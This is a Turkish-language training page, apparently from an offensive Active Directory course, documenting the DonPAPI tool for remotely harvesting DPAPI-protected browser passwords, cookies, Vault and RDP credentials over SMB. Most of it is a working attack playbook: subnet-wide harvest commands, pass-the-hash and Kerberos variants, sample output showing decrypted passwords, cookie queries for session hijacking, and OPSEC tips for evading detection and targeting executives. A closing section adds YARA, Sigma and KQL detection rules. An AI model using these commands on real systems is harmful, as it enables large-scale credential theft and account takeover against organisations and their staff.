# DonPAPI

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Hedef Windows sistemlerinde hiçbir süreç veya kod çalıştırmadan (Code-Executionless); SMB ve RPC protokolleri üzerinden uzaktan DPAPI (Data Protection API) anahtarlarını, Windows Vault kayıtlarını, Chrome/Edge/Firefox tarayıcı parolalarını ve çerezlerini otomatik olarak toplayıp etki alanı yedekleme anahtarıyla (Domain Backup Key) yerel olarak deşifre eden açık kaynaklı kimlik hasat motoru.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında kullanıcıların ve uygulamaların parolaları yalnızca LSASS bellek alanında bulunmaz. Windows işletim sistemi; web tarayıcı şifrelerini (Chrome, Edge, Brave), oturum çerezlerini (Session Cookies), Uzak Masaüstü (RDP) kayıtlı kimliklerini, Windows Kasa (Vault / Credential Manager) verilerini, Wi-Fi parolalarını ve özel sertifika anahtarlarını korumak için **DPAPI (Data Protection API)** mimarisini kullanır.

Klasik sızma testlerinde bu verileri çekmek için kurban makineye `LaZagne.exe`, `SharpDPAPI.exe` veya `Mimikatz` gibi çalıştırılabilir dosyalar indirilip çalıştırılır. Ancak bu durum EDR ajanları tarafından süreç oluşturma (Process Creation), bellek enjeksiyonu veya zararlı dosya tespit kurallarıyla anında yakalanır.

**`DonPAPI`** (Quentin Jerome / @zblurx tarafından geliştirilen), bu sorunu **kod çalıştırmama (Living-off-the-Network / Zero Code Execution)** mimarisiyle çözer:
1. **Yalnızca Ağ Dosya Erişimi (SMB Only):** Hedef sistem üzerinde hiçbir EXE, DLL veya PowerShell komutu çalıştırmaz. Yalnızca meşru yönetici SMB paylaşımlarına (`C$`, `ADMIN$`) bağlanarak şifreli DPAPI anahtar dosyalarını ve veri tabanlarını ağ üzerinden okur.
2. **MasterKey Hiyerarşisi:** Kullanıcıların DPAPI anahtarları (`%APPDATA%\Microsoft\Protect\<SID>\<GUID>`) etki alanı ortamlarında iki yolla açılabilir:
   - Kullanıcının açık metin parolası veya NTLM hash'i ile,
   - Etki Alanı Denetleyicisinin (DC) **DPAPI Domain Backup Key** (`pvk` özel anahtarı) ile.
3. **Merkezi Çözümleme (Offline Local Decryption):** `DonPAPI`, DC'den daha önce `impacket-secretsdump` ile çekilen `dpapi_backupkey.pvk` dosyasını kullanarak hedef makinedeki tüm kullanıcıların (aktif oturumu olmasa dahi) MasterKey'lerini saldırganın kendi Linux makinesinde çevrimdışı çözer.
4. **Kasa Hasadı:** Çözülen MasterKey'ler ile hedef makinedeki Chrome, Edge, Firefox, Vault, RDP ve VPN şifreleri tek bir hamlede açık metne dönüştürülüp SQLite veri tabanına kaydedilir.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                      SALDIRGAN MAKİNESİ (LINUX)                        │
│                                                                        │
│  [ DonPAPI ] ──(1) Önceden Alınan DPAPI Backup Key (domain_backup.pvk) │
│       │                                                                │
│       ├── (2) SMB Bağlantısı (Port 445 / Yetkili Kullanıcı)           │
│       │                                                                │
│       ├── (3) Şifreli Dosyaların Ağ Üzerinden Okunması (SMB Read):     │
│       │       - C$\Users\*\AppData\Roaming\Microsoft\Protect\<SID>\*   │
│       │       - C$\Users\*\AppData\Local\Google\Chrome\User Data\...   │
│       │       - C$\Users\*\AppData\Local\Microsoft\Credentials\*       │
│       │                                                                │
│       ├── (4) Yerel Çevrimdışı Deşifreleme (PVK ile MasterKey Çöz)    │
│       │                                                                │
│       └── (5) Parola ve Çerezlerin SQLite / Ekrana Yazdırılması        │
└───────────────────────────────────┬────────────────────────────────────┘
                                    │
                                    │ YALNIZCA SMB PROTOKOLÜ (TCP 445)
                                    │ [ Kod Yürütme YOK, Süreç YOK ]
                                    ▼
┌────────────────────────────────────────────────────────────────────────┐
│                      HEDEF WINDOWS SUNUCU / İSTEMCİ                    │
│                                                                        │
│  [ SMB Sunucusu (lanmanworkstation / srv2.sys) ]                       │
│       └── C$ Paylaşımından Salt-Okunur Dosya İletimi                   │
│                                                                        │
│  [ EDR / AV Durumu: Hiçbir Süreç Başlamadı, Bellek Taranmadı ]         │
└────────────────────────────────────────────────────────────────────────┘
```

### 1.1 DPAPI MasterKey ve Domain Backup Key Mekanizması

DPAPI, simetrik şifreleme algoritması (AES-256 / 3DES) kullanarak verileri şifreler. Şifreleme anahtarına **MasterKey** denir.
- Her MasterKey, kullanıcının profilinde `%APPDATA%\Microsoft\Protect\<User_SID>\<MasterKey_GUID>` dosyasında 512 baytlık ikili blok olarak saklanır.
- Bu dosyanın içerisinde iki ayrı şifrelenmiş kopya yer alır:
  1. **Kullanıcı Anahtarı:** Kullanıcının parola karması (PBKDF2 türetimi) ile şifrelenmiş blok.
  2. **Etki Alanı Kurtarma Anahtarı:** Etki alanı denetleyicisinin DPAPI genel anahtarı (`Domain Controller DPAPI Public Key`) ile RSA-2048 ile şifrelenmiş blok.
- `DonPAPI`, DC'den elde edilen özel anahtarı (`.pvk`) kullanarak kullanıcının parolasını hiç bilmeden doğrudan bu ikinci bloku çözer ve MasterKey'i elde eder. MasterKey elde edildikten sonra o kullanıcıya ait tüm tarayıcı şifreleri saniyeler içinde açılır.

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Sıfır Kod Çalıştırma** | Hedef üzerinde hiçbir EXE, DLL, PowerShell veya WMI kodu çalıştırmaz. | Süreç izleme (Sysmon 1 / Event 4688) ve EDR komut satırı kurallarını tamamen etkisiz kılar. |
| **Tüm Kullanıcıları Kapsama** | Yalnızca o an oturum açmış kullanıcıları değil; diskteki tüm geçmiş kullanıcıları çözer. | Hedef sunucuya 6 ay önce giriş yapmış bir yöneticinin dahi şifrelerini çeker. |
| **Tarayıcı ve Kasa Zenginliği** | Chrome, Edge, Firefox, Brave, Windows Vault, Wi-Fi, RDP, mRemoteNG destekler. | Tek komutla yüzlerce kurumsal web paneli ve bulut hizmeti kimliğini toplar. |
| **Toplu Alt Ağ Taraması** | CIDR IP bloklarını paralel SMB iş parçacıklarıyla tarayabilir. | Ağ genelinde saatler içinde devasa bir kimlik veri tabanı (SQLite) oluşturur. |

### Karşılaştırma Tablosu

| Kriter | DonPAPI | SharpDPAPI | Mimikatz (dpapi) | LaZagne |
|---|---|---|---|---|
| **Kod İcrası** | **YOK (Sadece SMB)** | VAR (.NET Assembly) | VAR (Yerel C) | VAR (Python/EXE) |
| **Çalıştığı Ortam** | Saldırgan Makinesi (Linux) | Hedef Makine (Windows) | Hedef Makine | Hedef Makine |
| **Domain Backup Key Desteği**| VAR (`.pvk` / NTDS) | VAR (`/pvk:`) | VAR | YOK |
| **EDR Tespit Riski** | Sıfıra Yakın (Dosya erişimi) | Orta (Bellek içi C#) | Çok Yüksek | Çok Yüksek |
| **Veri Tabanı Desteği** | SQLite Otomatik Kayıt | Konsol Çıktısı | Konsol Çıktısı | JSON / Konsol |

### 1.2 Windows Vault, Credential Manager ve Tarayıcı Şifre Depolama Yapıları

Windows işletim sistemlerinde DPAPI ile korunan veriler farklı dosya yollarında ve tescilli ikili yapılarda saklanır:
- **Windows Credential Manager:**
  - Konum: `%APPDATA%\Microsoft\Credentials\` ve `%LOCALAPPDATA%\Microsoft\Credentials\`
  - Bu dizindeki her dosya bir DPAPI `BLOB` yapısıdır. RDP bağlantı parolaları (`TERMSRV/*`), Windows Live hesapları ve yerel etki alanı SSO oturum kimlikleri burada tutulur.
- **Windows Vault:**
  - Konum: `%LOCALAPPDATA%\Microsoft\Vault\<GUID>\`
  - Web kimlik bilgileri ve Windows uygulamalarının (Skype, Teams vb.) parolalarını `Policy.vpol` ve `.vcrd` dosyalarında şifreli olarak barındırır.
- **Chromium Tabanlı Tarayıcılar (Chrome, Edge, Brave):**
  - Konum: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\` (veya `%APPDATA%`)
  - `Login Data` ve `Network\Cookies` SQLite veritabanlarıdır. Parolalar ve çerezler AES-256-GCM ile şifrelenir; bu AES anahtarı ise `Local State` dosyasındaki `encrypted_key` alanında kullanıcının DPAPI MasterKey'i ile şifrelenmiş halde bekler.
- **Mozilla Firefox:**
  - Konum: `%APPDATA%\Mozilla\Firefox\Profiles\<profile>\`
  - `logins.json` ve `key4.db` (NSS veritabanı) dosyalarında şifrelenir. DonPAPI, Linux üzerinde bu SQLite ve NSS yapılarını otomatik olarak deşifre eder.

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
donpapi <hedef_veya_cidr> -u <kullanici> -p <parola> -d <domain> [seçenekler]
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-u`, `--username` | SMB yetkili kullanıcı adı (Local Administrator veya Domain Admin). | `-u Administrator` |
| `-p`, `--password` | Kullanıcı açık metin parolası. | `-p 'P@ssw0rd2026!'` |
| `-H`, `--hashes` | Pass-the-Hash için NTLM hash (`LM:NTLM` veya `:NTLM`). | `-H :01fc5a6be7bc6929c40372d23f5052b3` |
| `-d`, `--domain` | Etki alanı adı (FQDN veya NetBIOS). | `-d corp.local` |
| `-k`, `--kerberos` | Kerberos kimlik doğrulaması kullan (`KRB5CCNAME` biletini okur). | `-k -no-pass` |
| `--pvk` | Domain Controller'dan çekilen DPAPI özel kurtarma anahtarı dosyası. | `--pvk domain_backupkey.pvk` |
| `--ntds` | Daha önce çekilmiş `ntds.dit` veya secretsdump çıktı dosyası. | `--ntds ntds_hashes.txt` |
| `--export-dir` | Çözülen parolaların, çerezlerin ve MasterKey'lerin kaydedileceği klasör. | `--export-dir /root/loot/` |
| `--threads` | Eşzamanlı taranacak hedef IP sayısı (Varsayılan: 10). | `--threads 20` |
| `-c`, `--cred` | Özel parola veya NTLM listesi sağlayarak MasterKey çözme. | `-c creds.txt` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Domain Backup Key (`.pvk`) ile Tekil Hedefin Tüm Verilerini Çekme

Önceden `secretsdump` ile etki alanı denetleyicisinden alınmış `.pvk` kurtarma anahtarı kullanılarak hedef sunucudaki tüm kullanıcıların tarayıcı ve kasa şifreleri uzaktan toplanır.

```bash
donpapi 192.168.1.50 -d corp.local -u AdminUser -p 'Summer2026!' --pvk domain_backupkey.pvk
```

**Konsol Çıktısı Analizi:**

```text
[+] [192.168.1.50] Connected to SMB
[+] [192.168.1.50] Authenticated as corp.local\AdminUser
[*] [192.168.1.50] Enumerating users on C$\Users...
[*] [192.168.1.50] Found user: C$\Users\Administrator
[*] [192.168.1.50] Found user: C$\Users\jdoe
[*] [192.168.1.50] Collecting MasterKeys for jdoe...
[+] [192.168.1.50] Decrypted MasterKey {a9c8b7d6-1e2f-4a5b-8c9d-0e1f2a3b4c5d} via Domain Backup Key (PVK)!
[*] [192.168.1.50] Parsing Chrome Login Data for jdoe...
  URL: https://vpn.corp.local
  Username: jdoe@corp.local
  Password: SecureVpnPassword2026!
[*] [192.168.1.50] Parsing Windows Vault Credentials...
  Target: WindowsLive:target=virtualapp/didlogical
  Username: corp\jdoe
  Password: SecretVaultPass!
[+] [192.168.1.50] Data successfully written to loot/donpapi.db
```

---

### Senaryo 2: NTLM Hash (Pass-the-Hash) ile Uzak DPAPI Dökümü Alma

Parolası bilinmeyen bir yerel yönetici veya etki alanı hesabı için NTLM hash'i ile bağlanarak MasterKey'ler kullanıcının kendi hash'i üzerinden çözülür.

```bash
donpapi 192.168.1.50 -d corp.local -u Administrator -H :01fc5a6be7bc6929c40372d23f5052b3
```

---

### Senaryo 3: Tüm Etki Alanı Alt Ağında (CIDR) Otomatik Toplu Hasat

Tüm bir C sınıfı alt ağ taranarak ağdaki tüm sistemlerdeki tarayıcı parolaları ve oturum çerezleri tek bir SQLite tablosunda birleştirilir.

```bash
donpapi 192.168.1.0/24 -d corp.local -u AdminUser -p 'P@ssw0rd!' --pvk domain_backup.pvk --threads 15 --export-dir /root/ad_loot/
```

---

### Senaryo 4: Kerberos Bileti ile Parolasız ve İz Bırakmadan Tarama

Saldırgan makinede bulunan geçerli bir bilet ile NTLM trafiği oluşturmadan hedef taranır:

```bash
export KRB5CCNAME=/tmp/admin.ccache
donpapi file-server.corp.local -k -no-pass -d corp.local --pvk domain_backup.pvk
```

---

### Senaryo 5: Toplanan Verilerin SQLite Veri Tabanında Sorgulanması

DonPAPI'nin ürettiği `donpapi.db` veri tabanı açılarak kritik VPN veya bulut kimliklerinin filtrelenmesi:

```bash
sqlite3 loot/donpapi.db "SELECT target, username, password FROM credentials WHERE target LIKE '%vpn%';"
sqlite3 loot/donpapi.db "SELECT host_key, name, value FROM cookies WHERE host_key LIKE '%azure%';"
```

---

### Senaryo 6: Yalnızca Belirli Bir Kullanıcının Çerezlerini ve Parolalarını İndirme

Gereksiz dosya trafiği oluşturmamak için yalnızca hedef bir yöneticinin profiline odaklanma:

```bash
donpapi 192.168.1.50 -d corp.local -u AdminUser -p 'Pass!' --pvk backup.pvk --user DA_Admin
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `STATUS_ACCESS_DENIED (0xc0000022)` | Kullanıcının hedef makinede `C$` yönetim paylaşımına erişim yetkisi yok. | Hesabın hedef makinede Yerel Yönetici veya Domain Admin grubunda olduğunu doğrulayın; UAC Remote Restrictions ayarlarını denetleyin. |
| `[-] MasterKey could not be decrypted with PVK` | Sağlanan `.pvk` anahtarı hedef kullanıcının ait olduğu etki alanının kurtarma anahtarı değil (Trust / Forest ayrımı). | Doğru etki alanının DC'sinden `secretsdump` ile backup key'i tekrar çekin (`impacket-secretsdump -pvk ...`). |
| `Chrome App-Bound Encryption Error (v20+)` | Google Chrome v127+ sürümünde Windows üzerinde SYSTEM seviyesinde yeni bir hizmet ile DPAPI şifrelemesini sarmalamıştır. | DonPAPI'nin en güncel sürümünü kullanın veya hedefte SYSTEM yetkileriyle App-Bound anahtarını çözün. |
| `STATUS_BAD_NETWORK_NAME / Cannot open share` | Hedef sistemde Dosya ve Yazıcı Paylaşımı kapalı veya Güvenlik Duvarı TCP 445 portunu engelliyor. | Hedef IP'ye Port 445 üzerinden erişilebildiğini `nc -zv <IP> 445` veya `nmap` ile test edin. |
| `No MasterKey found for user` | Kullanıcı bu makinede henüz oturum açmamış veya DPAPI kullanan hiçbir uygulama çalıştırmamış. | Normal bir durumdur; sistemde aktif kullanılan diğer kullanıcı profillerini inceleyin. |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Kerberos modunda IP adresi kullanıldı; Kerberos SPN çözümlemesi için NetBIOS/FQDN adı şarttır. | Hedef olarak IP yerine FQDN (`fileserver.corp.local`) kullanın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: DÜŞÜK (KOD YÜRÜTME YOK - YALNIZCA SMB OKUMA)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4624 (Logon Type 3), Event ID 5140 (Share)
[ Sysmon ]          : Süreç oluşturma (Event 1) YOK, DLL Enjeksiyonu YOK
[ Ağ İmzaları ]     : AppData\Microsoft\Protect Dizininde Çoklu SMB2_READ
[ EDR Davranışı ]   : Dosya erişim anomalisi haricinde doğrudan alarm üretmez
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4624 (Logon Type 3 - Network):**
   - Saldırgan makinesinden hedef makineye Port 445 üzerinden yetkili ağ oturumu açılması.
2. **Windows Security Event ID 5140 & 5145 (Network Share Object Checked):**
   - Hedef makinedeki `C$` paylaşımı altında `\Users\*\AppData\Roaming\Microsoft\Protect\` ve `\Users\*\AppData\Local\Google\Chrome\User Data\` dizinlerine yönelik ardışık okuma erişimi (`AccessMask: 0x1` / `READ_CONTROL`).
3. **Süreç İzi Yoktur:**
   - Hedef makinede hiçbir yeni süreç (`Process Creation`) başlamaz; hiçbir DLL belleğe enjekte edilmez.

### 5.2 Ağ ve EDR İmzaları

- **SMB Trafik İmzası:** Kısa süre içerisinde birden fazla kullanıcının `Protect` ve tarayıcı dizinlerinin SMB üzerinden taranması, gelişmiş ağ tabanlı IDS/NDR (Network Detection and Response) sistemlerinde anomali oluşturabilir.
- **EDR Tehdit Avcılığı:** Klasik EDR ajanları komut satırı ve bellek odaklı çalıştığından, DonPAPI'nin bu salt-ağ yaklaşımı çoğu uç nokta dedektörünü sessizce atlatır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1555.003** | Credentials from Password Stores: Web Browsers | Chrome, Edge ve Firefox şifre ve çerezlerini çekme. |
| **T1555.004** | Credentials from Password Stores: Windows Credential Manager | Windows Kasa ve Vault kayıtlarını uzaktan çözme. |
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | C$ paylaşımı üzerinden dosya tabanlı kimlik hasadı. |
| **T1552.001** | Unsecured Credentials: Credentials in Files | Diskteki şifreli DPAPI anahtar dosyalarını okuma. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Yoğun SMB Okuma Anomalisi** | Tüm alt ağı aynı anda yüksek iş parçacığıyla (`--threads 50`) taramayın; iş parçacığını düşük tutun (`--threads 2-5`) ve hedefler arasına gecikme koyun. |
| **Gereksiz Dosya Taraması** | İhtiyaç duyulmayan tarayıcıları veya kullanıcı profillerini atlayarak yalnızca hedef kullanıcıyı (`--user`) sorgulayın. |
| **Log İzleme (Event 5145)** | Paylaşım erişim denetimi (Share Auditing) çok aktif olan hassas sunucularda (Örn: Domain Controller) doğrudan PVK ile çevrimdışı önceden alınmış kopyalar üzerinde çalışın. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma & YARA)

**YARA Kuralı — DonPAPI Python Aracı ve DB Çıktı İmzası:**

```yara
rule Suspicious_DonPAPI_Tool {
    meta:
        description = "Detects DonPAPI tool scripts and specific database outputs"
        author = "Active Directory Security Project"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "donpapi" ascii nocase
        $s2 = "domain_backupkey" ascii nocase
        $s3 = "Chrome Login Data" ascii
        $s4 = "Decrypted MasterKey" ascii
    condition:
        2 of them
}
```

**Sigma Kuralı — C$ Paylaşımında Şüpheli DPAPI Anahtar Taraması (Event ID 5145):**

```yaml
title: Suspicious Remote DPAPI MasterKey Access via SMB
status: experimental
description: Detects remote access to Microsoft Protect folder across multiple users via administrative shares indicative of DonPAPI.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5145
    ShareName: '\\*\C$'
    RelativeTargetName|contains: '\AppData\Roaming\Microsoft\Protect\'
  condition: selection
level: high
```

**Microsoft Sentinel (KQL) — Şüpheli Ağ Üzerinden DPAPI Erişimi:**

```kql
SecurityEvent
| where EventID == 5145
| where ShareName endswith "C$"
| where RelativeTargetName has @"Microsoft\Protect"
| summarize AccessCount = count(), Targets = make_set(RelativeTargetName) by Computer, SubjectUserName, IpAddress, bin(TimeGenerated, 5m)
| where AccessCount > 5
| project TimeGenerated, Computer, SubjectUserName, IpAddress, AccessCount, Targets
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Domain Backup Key ile Standart Hedef Hasadı
```bash
donpapi 192.168.1.50 -d corp.local -u AdminUser -p 'P@ss!' --pvk backup.pvk
```
- **Ne Yapar?** Hedefe SMB ile bağlanır, tüm kullanıcıların MasterKey'lerini PVK ile çözer, tarayıcı ve kasa şifrelerini çeker.
- **Ne Zaman Kullanılır?** Etki alanı genelinde parola çekmek için en sessiz ve etkili yöntem olarak.
- **Parametreler:** `-d`: Etki alanı, `-u`: Kullanıcı, `-p`: Parola, `--pvk`: Kurtarma anahtarı.

### Komut 2: Pass-the-Hash ile Parolasız Çalıştırma
```bash
donpapi 192.168.1.50 -d corp.local -u Admin -H :01fc5a... --pvk backup.pvk
```
- **Ne Yapar?** Açık metin parola olmadan NTLM hash ile oturum açarak DPAPI verilerini toplar.
- **Ne Zaman Kullanılır?** Yanal harekette sadece hash ele geçirildiğinde.
- **Parametreler:** `-H`: NTLM hash değeri.

### Komut 3: Tüm CIDR Alt Ağında Paralel Hasat
```bash
donpapi 192.168.1.0/24 -d corp.local -u Admin -p 'P@ss!' --pvk backup.pvk --threads 15
```
- **Ne Yapar?** Belirtilen ağdaki tüm Windows makinelerini paralel iş parçacıklarıyla tarar.
- **Ne Zaman Kullanılır?** Ağ genelinde kapsamlı tarayıcı ve kimlik haritalaması yaparken.
- **Parametreler:** `192.168.1.0/24`: Hedef IP bloğu, `--threads 15`: Eşzamanlı iş parçacığı.

### Komut 4: Kerberos Bileti ile Parolasız Oturum
```bash
KRB5CCNAME=/tmp/ticket.ccache donpapi dc01.corp.local -k -no-pass -d corp.local --pvk backup.pvk
```
- **Ne Yapar?** Kerberos kimlik doğrulaması kullanarak hedef sunucudan kimlikleri çeker.
- **Ne Zaman Kullanılır?** NTLM trafiğinin filtrelendiği veya Golden Ticket kullanıldığı ortamlarda.
- **Parametreler:** `-k`: Kerberos kullan, `-no-pass`: Parola sorma.

### Komut 5: Çıktıları Belirli Bir Klasöre İndirme
```bash
donpapi 192.168.1.50 -d corp.local -u Admin -p 'P@ss!' --pvk backup.pvk --export-dir /root/loot/
```
- **Ne Yapar?** SQLite veri tabanını ve ham dosyaları `/root/loot/` klasörüne kaydeder.
- **Ne Zaman Kullanılır?** Operasyon verilerini düzenli bir dizin yapısında saklamak için.
- **Parametreler:** `--export-dir`: Çıktı klasörü yolu.

### Komut 6: Yalnızca Belirli Bir Kullanıcıyı Hedefleme
```bash
donpapi 192.168.1.50 -d corp.local -u Admin -p 'P@ss!' --pvk backup.pvk --user CEO_User
```
- **Ne Yapar?** Diğer kullanıcı profillerini atlayarak yalnızca `CEO_User` kullanıcısının verilerini okur.
- **Ne Zaman Kullanılır?** VIP hedef odaklı operasyonlarda minimum gürültü oluşturmak için.
- **Parametreler:** `--user`: Hedef kullanıcı adı.

### Komut 7: Parola Listesi ile MasterKey Çözme
```bash
donpapi 192.168.1.50 -d corp.local -u Admin -p 'P@ss!' -c passwords.txt
```
- **Ne Yapar?** PVK anahtarı yoksa kullanıcıların MasterKey'lerini parola listesindeki şifrelerle çözmeyi dener.
- **Ne Zaman Kullanılır?** Domain Controller'a erişilemediği veya Backup Key alınamadığı durumlarda.
- **Parametreler:** `-c`: Parola listesi dosyası.

### Komut 8: SQLite Veri Tabanında Şifre Arama
```bash
sqlite3 /root/loot/donpapi.db "SELECT * FROM credentials;"
```
- **Ne Yapar?** DonPAPI tarafından çıkarılan tüm şifreleri tablo halinde ekrana döker.
- **Ne Zaman Kullanılır?** Toplanan verileri analiz ederken.
- **Parametreler:** `sqlite3` komut satırı sorgulayıcısı.

### Komut 9: SQLite Veri Tabanından Çerezleri Çekme
```bash
sqlite3 /root/loot/donpapi.db "SELECT host_key, name, value FROM cookies;"
```
- **Ne Yapar?** Ele geçirilen web oturum çerezlerini listeler.
- **Ne Zaman Kullanılır?** MFA/2FA korumalı bulut oturumlarına doğrudan tarayıcı üzerinden sızmak (Session Hijacking) için.
- **Parametreler:** SQL çerez sorgusu.

### Komut 10: NTDS Dosyası ile Çevrimdışı Eşleştirme
```bash
donpapi 192.168.1.50 -d corp.local -u Admin -p 'P@ss!' --ntds ntds.dit.hashes
```
- **Ne Yapar?** NTDS dökümündeki hash'leri kullanarak yerel kullanıcıların MasterKey'lerini açar.
- **Ne Zaman Kullanılır?** Önceden DCSync yapılmış bir ortamda PVK yerine hash tabanlı çözümleme için.
- **Parametreler:** `--ntds`: Hash dosyası.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [login-securite / DonPAPI](https://github.com/login-securite/DonPAPI)
- **Zblurx Araştırma Blogu:** [DonPAPI: Dumping DPAPI Secrets Remotely Without Code Execution](https://blog.zblurx.fr/)
- **MITRE ATT&CK Referansı:** [T1555 - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)
- **Microsoft DPAPI Mimarisi:** [Windows Data Protection API (DPAPI) Architecture](https://learn.microsoft.com/en-us/previous-versions/ms995355(v=msdn.10))

---

> **Önceki:** [← PPLKiller](./PPLKiller.md) · **Sonraki:** [SharpDPAPI →](./SharpDPAPI.md)
